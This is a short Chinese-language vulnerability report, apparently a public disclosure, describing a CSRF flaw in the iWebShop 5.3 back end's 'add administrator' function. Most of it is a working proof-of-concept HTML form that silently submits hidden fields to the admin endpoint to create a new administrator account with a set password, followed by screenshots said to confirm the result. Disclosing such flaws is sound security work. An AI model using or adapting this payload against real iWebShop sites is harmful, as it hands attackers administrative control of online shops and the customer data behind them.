**iWebShop5.3后台存在CSRF漏洞**

1.在`管理员`->`添加管理员`功能处存在CSRF漏洞

![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1g0vg867mdmj30tz0nt75j.jpg)
POC

`<html>`

  <body>

  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.138.132/iw/index.php?controller=system&action=admin_edit_act" method="POST">
      <input type="hidden" name="id" value="" />
      <input type="hidden" name="admin&#95;name" value="test" />
      <input type="hidden" name="password" value="test888" />
      <input type="hidden" name="repassword" value="test888" />
      <input type="hidden" name="role&#95;id" value="0" />
      <input type="hidden" name="email" value="1&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  `</body>`
`</html>`

验证

![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1g0vg868y55j31ef0il0v8.jpg)

发现可以添加后台管理员

官网链接

`http://www.aircheng.com/`

